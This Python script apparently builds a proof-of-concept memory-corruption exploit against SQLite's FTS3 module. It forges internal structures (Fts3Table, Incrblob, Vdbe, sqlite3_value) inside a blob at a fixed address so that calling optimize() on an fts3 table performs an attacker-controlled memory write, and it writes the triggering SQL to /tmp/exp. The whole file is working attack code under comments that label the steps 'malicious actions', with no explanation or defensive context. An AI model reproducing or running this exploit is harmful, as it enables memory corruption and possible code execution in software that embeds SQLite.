#!/usr/bin/env python3

import os
import sys

def valToStr(value, length):
    b = '{num:0{width}X}'.format(num=value, width=length * 2)
    c = "".join(reversed([b[i:i+2] for i in range(0, len(b), 2)]))
    return c

def writeStr(exp, off, string):
    exp = list(exp)
    string = list(string)
    for i in range(0, len(string)):
        exp[off + i] = string[i]
    return ''.join(exp)

def writeVal(exp, off, value, length=8):
    return writeStr(exp, off * 2, valToStr(value, length))

exp = valToStr(0xdeadbeef, 8) + "0" * 0x800 * 2
base = 0x667ad8

src_ptr = base + 0x10
dst_ptr = base + 0x20

#----------------------------------------------------------
# expected layout:

# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# Vdbe_metadata (0x8)
# Vdbe (0x138)
# sqlite3_value_metadata (0x8)
# sqlite3_value (0x48)

#----------------------------------------------------------
# required type.member values:

# Fts3Cursor.base.pVtable = &Fts3Table  (line 182454 @ fts3OptimizeFunc)
# Fts3Table.pSegments = &Incrblob       (line 98925 @ sqlite3_blob_close)
# Incrblob.db = &sqlite3                (line 98931 @ sqlite3_blob_close)
# sqlite3.pnBytesFreed = &nBytesFreed   (line 29385 @ sqlite3DbFreeNN)
# Incrblob.pStmt = &Vdbe                (line 87440 @ sqlite3_finalize)
# Vdbe.db = &sqlite3                    (line 87441 @ sqlite3_finalize)
# Vdbe.eVdbeState = 1                   (line 87445 @ sqlite3_finalize)
# Vdbe.zErrMsg = sre_ptr                (line 85445 @ sqlite3VdbeReset)
# sqlite3.pErr = &sqlite3_value         (line 85445 @ sqlite3VdbeReset)
# sqlite3_value.szMalloc = 0x100        (line 80324 @ sqlite3VdbeMemClearAndResize)
# sqlite3_value.zMalloc = dst_ptr       (line 80328 @ sqlite3VdbeMemClearAndResize)

#----------------------------------------------------------
# common sizes and offsets

# sizeof types
Fts3Cursor_size = 0x80
Fts3Table_size = 0x220
Incrblob_metadata_size = 0x8
Incrblob_size = 0x38
sqlite3_size = 0x308
nBytesFreed_size = 0x4
Vdbe_metadata_size = 0x8
Vdbe_size = 0x138
sqlite3_value_metadata_size = 0x8
sqlite3_value_size = 0x48

# offset_type_member -> offset of member within type

# raddr -> address relative to base
#       -> offset relattive to exp
raddr_Fts3Cursor = 0
raddr_Fts3Table = Fts3Cursor_size
raddr_Incrblob_metadata = raddr_Fts3Table + Fts3Table_size
raddr_Incrblob = raddr_Incrblob_metadata + Incrblob_metadata_size
raddr_sqlite3 = raddr_Incrblob + Incrblob_size
raddr_nBytesFreed = raddr_sqlite3 + sqlite3_size
raddr_Vdbe_metadata = raddr_nBytesFreed + nBytesFreed_size
raddr_Vdbe = raddr_Vdbe_metadata + Vdbe_metadata_size
raddr_sqlite3_value_metadata = raddr_Vdbe + Vdbe_size
raddr_sqlite3_value = raddr_sqlite3_value_metadata + sqlite3_value_metadata_size

#----------------------------------------------------------
# malicious actions

# Fts3Cursor.base.pVtab = &Fts3Table
offset_Fts3Cursor_pVtab = 0
raddr_Fts3Cursor_pVtab = raddr_Fts3Cursor + offset_Fts3Cursor_pVtab
addr_Fts3Table = base + raddr_Fts3Table
exp = writeVal(exp, raddr_Fts3Cursor_pVtab, addr_Fts3Table)

# Fts3Table.pSegments = &Incrblob
offset_Fts3Table_pSegments = 0x1e0
raddr_Fts3Table_pSegments = raddr_Fts3Table + offset_Fts3Table_pSegments
addr_Incrblob = base + raddr_Incrblob
exp = writeVal(exp, raddr_Fts3Table_pSegments, addr_Incrblob)

# Incrblob.db = &sqlite3
offset_Incrblob_db = 0x20
raddr_Incrblob_db = raddr_Incrblob + offset_Incrblob_db
addr_sqlite3 = base + raddr_sqlite3
exp = writeVal(exp, raddr_Incrblob_db, addr_sqlite3)

# sqlite3.pnBytesFreed = &nBytesFreed   (line 29385 @ sqlite3DbFreeNN)
offset_sqlite3_pnBytesFreed = 0x300
raddr_sqlite3_pnBytesFreed = raddr_sqlite3 + offset_sqlite3_pnBytesFreed
addr_nBytesFreed = base + raddr_nBytesFreed
exp = writeVal(exp, raddr_sqlite3_pnBytesFreed, addr_nBytesFreed)

# sqlite3.lookaside.pTrueEnd = 0        (line 29305 @ isqlite3DbMallocSize)
offset_sqlite3_lookaside_pTrueEnd = 0x1f0
raddr_lookaside_pTrueEnd = raddr_sqlite3 + offset_sqlite3_lookaside_pTrueEnd
pTrueEnd_val = 0
exp = writeVal(exp, raddr_lookaside_pTrueEnd, pTrueEnd_val)

# Incrblob.pStmt = &Vdbe                (line 87440 # sqlite3_finalize)
offset_Incrblob_pStmt = 0x18
raddr_Incrblob_pStmt = raddr_Incrblob + offset_Incrblob_pStmt
addr_Vdbe = base + raddr_Vdbe
exp = writeVal(exp, raddr_Incrblob_pStmt, addr_Vdbe)

# Vdbe.db = &sqlite3                    (line 87441 @ sqlite3_finalize)
offset_Vdbe_db = 0x0
raddr_Vdbe_db = raddr_Vdbe + offset_Vdbe_db
exp = writeVal(exp, raddr_Vdbe_db, addr_sqlite3)

# Vdbe.eVdbeState = 1                   (line 87445 @ sqlite3_finalize)
offset_Vdbe_eVdbeState = 0xcd
raddr_Vdbe_eVdbeState = raddr_Vdbe + offset_Vdbe_eVdbeState
eVdbeState_val = 1
exp = writeVal(exp, raddr_Vdbe_eVdbeState, eVdbeState_val, 1)

# Vdbe.zErrMsg = src_ptr                (line 85445 @ sqlite3VdbeReset)
offset_Vdbe_zErrMsg = 0xa8
raddr_Vdbe_zErrMsg = raddr_Vdbe + offset_Vdbe_zErrMsg
zErrMsg_val = src_ptr
exp = writeVal(exp, raddr_Vdbe_zErrMsg, zErrMsg_val)

# sqlite3.pErr = &sqlite3_value         (line 85445 @ sqlite3VdbeReset)
offset_sqlite3_pErr = 0x188
raddr_sqlite3_pErr = raddr_sqlite3 + offset_sqlite3_pErr
addr_sqlite3_value = base + raddr_sqlite3_value
exp = writeVal(exp, raddr_sqlite3_pErr, addr_sqlite3_value)

# sqlite3_value.szMalloc = 0x100        (line 80324 @ sqlite3VdbeMemClearAndResize)
offset_sqlite3_value_szMalloc = 0x20
raddr_sqlite3_value_szMalloc = raddr_sqlite3_value + offset_sqlite3_value_szMalloc
szMalloc_val = 0x100
exp = writeVal(exp, raddr_sqlite3_value_szMalloc, szMalloc_val, 4)

# sqlite3_value.zMalloc = dst_ptr       (line 80328 @ sqlite3VdbeMemClearAndResize)
offset_sqlite3_value_zMalloc = 0x28
raddr_sqlite3_value_zMalloc = raddr_sqlite3_value + offset_sqlite3_value_zMalloc
zMalloc_val = dst_ptr
exp = writeVal(exp, raddr_sqlite3_value_zMalloc, zMalloc_val)

with open('/tmp/exp', 'w') as f:
    f.write("create table t1(c1 char);\n")
    f.write("insert into t1 values(x'" + exp + "');\n")
    f.write("create virtual table a using fts3(b);\n")
    f.write("insert into a values(x'" + valToStr(base, 8) + "');\n")
    f.write("select optimize(b) from a;\n")
    f.write("select sqlite_version();\n")
